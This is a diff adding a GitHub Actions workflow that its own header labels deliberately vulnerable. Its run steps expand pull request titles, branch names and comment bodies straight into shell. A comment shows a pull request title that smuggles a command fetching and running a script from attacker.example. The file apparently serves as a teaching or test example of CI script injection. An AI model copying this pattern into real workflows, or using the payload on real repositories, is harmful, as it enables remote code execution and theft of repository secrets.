@@ -1,0 +1,21 @@
+# Deliberately vulnerable: untrusted event fields expanded straight into shell scripts.
+name: triage
+on:
+  pull_request_target:
+  issue_comment:
+permissions:
+  contents: read
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      # A pull request titled `x"; curl https://attacker.example/x | sh; echo "` runs the curl.
+      - name: echo the title
+        run: echo "Title was ${{ github.event.pull_request.title }}"
+      - name: check the branch
+        run: |
+          if [[ "${{ github.head_ref }}" == release/* ]]; then
+            echo "release branch"
+          fi
+      - name: read the comment
+        run: echo ${{ github.event.comment.body }} > comment.txt
